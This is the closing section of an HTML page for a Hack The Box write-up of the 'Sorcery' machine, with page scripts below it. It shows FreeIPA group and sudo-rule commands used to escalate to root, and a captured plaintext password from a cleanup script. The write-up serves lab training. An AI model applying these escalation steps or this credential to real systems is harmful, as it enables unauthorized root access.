+<h2 id="shell-root">Shell as root</h2>
+
+<h3 id="sudo-abuse">Sudo Rule Abuse via FreeIPA</h3>
+<p><code>ash_winter</code> has an indirect role <code>add_sysadmin</code> which allows adding users to the <code>sysadmins</code> group. The <code>sysadmins</code> group has the <code>manage_sudorules_ldap</code> role, which can modify sudo rules. The attack chain:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Add self to sysadmins
+ash_winter@main$ ipa group-add-member sysadmins --users=ash_winter
+
+# Add self to the allow_sudo rule
+ash_winter@main$ ipa sudorule-add-user allow_sudo --users=ash_winter
+
+# Restart SSSD to pick up changes (ash_winter can do this with sudo)
+ash_winter@main$ sudo systemctl restart sssd
+
+# Now have full sudo
+ash_winter@main$ sudo su -
+root@main:~# cat root.txt
+dd45620a************************</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="beyond-root">Beyond Root</h2>
+
+<h3 id="cleanup">Cleanup Script Abuse</h3>
+<p>A systemd timer runs <code>/opt/scripts/cleanup.sh</code> every 10 minutes as the IPA admin. Before the box was patched, this script reset <code>ash_winter</code>'s password in plaintext on the command line:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># pspy catches this every 10 minutes:
+CMD: UID=1638400000 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep</code></pre>
+</div>
+
+<p>This was patched before retirement — the password is now read from a file instead of being passed as a CLI argument, and the admin keytab password was renewed (it had expired).</p>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  <p>&copy; 2025 QA210 — Hack The Box Writeups &nbsp;·&nbsp; Sorcery — Insane</p>
+</footer>
+
+<script>
+// ── Three.js Background ──────────────────────
+(function(){
+  const c=document.getElementById('three-bg');
+  const r=new THREE.WebGLRenderer({canvas:c,alpha:true,antialias:true});
+  r.setSize(window.innerWidth,window.innerHeight);
+  r.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const s=new THREE.Scene();
+  const cam=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,1000);
+  cam.position.z=50;
+  const geo=new THREE.IcosahedronGeometry(18,1);
+  const mat=new THREE.MeshBasicMaterial({color:0x818cf8,wireframe:true,transparent:true,opacity:0.3});
+  const mesh=new THREE.Mesh(geo,mat);
+  s.add(mesh);
+  const pts=[];
+  for(let i=0;i<200;i++){
+    pts.push(new THREE.Vector3((Math.random()-0.5)*100,(Math.random()-0.5)*100,(Math.random()-0.5)*100));
+  }
+  const pgeo=new THREE.BufferGeometry().setFromPoints(pts);
+  const pmat=new THREE.PointsMaterial({color:0x22d3ee,size:0.5,transparent:true,opacity:0.6});
+  const particles=new THREE.Points(pgeo,pmat);
+  s.add(particles);
+  function animate(){
+    requestAnimationFrame(animate);
+    mesh.rotation.x+=0.001;mesh.rotation.y+=0.002;
+    particles.rotation.y+=0.0003;
+    r.render(s,cam);
+  }
+  animate();
+  window.addEventListener('resize',()=>{
+    cam.aspect=window.innerWidth/window.innerHeight;
+    cam.updateProjectionMatrix();
+    r.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+
+// ── Copy Button ──────────────────────────────
+function copyCode(btn){
+  const code=btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+// ── Build TOC ────────────────────────────────
+function buildToc(){
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const tocD=document.getElementById('tocDesktop');
+  const tocM=document.getElementById('tocMobile');
+  let html='';
+  headings.forEach(h=>{
+    if(!h.id)h.id=h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const cls=h.tagName==='H3'?'toc-h3':'';
+    html+=`<li><a href="#${h.id}" class="${cls}" data-target="${h.id}">${h.textContent}</a></li>`;
+  });
+  tocD.innerHTML=html;tocM.innerHTML=html;
+}
+buildToc();
+
+// ── Active Section Tracking ──────────────────
+function trackActiveSection(){
+  const links=document.querySelectorAll('#tocDesktop a,#tocMobile a');
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const observer=new IntersectionObserver(entries=>{
+    entries.forEach(entry=>{
+      if(entry.isIntersecting){
+        links.forEach(l=>l.classList.remove('active'));
+        document.querySelectorAll(`[data-target="${entry.target.id}"]`).forEach(l=>l.classList.add('active'));
+      }
+    });
+  },{rootMargin:'-80px 0px -70% 0px',threshold:0});
+  headings.forEach(h=>observer.observe(h));
+}
+trackActiveSection();
+
+// ── Mobile TOC Toggle ────────────────────────
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+document.getElementById('tocMobile').addEventListener('click',e=>{
+  if(e.target.tagName==='A')toggleMobileToc();
+});
+</script>
+</body>
+</html>
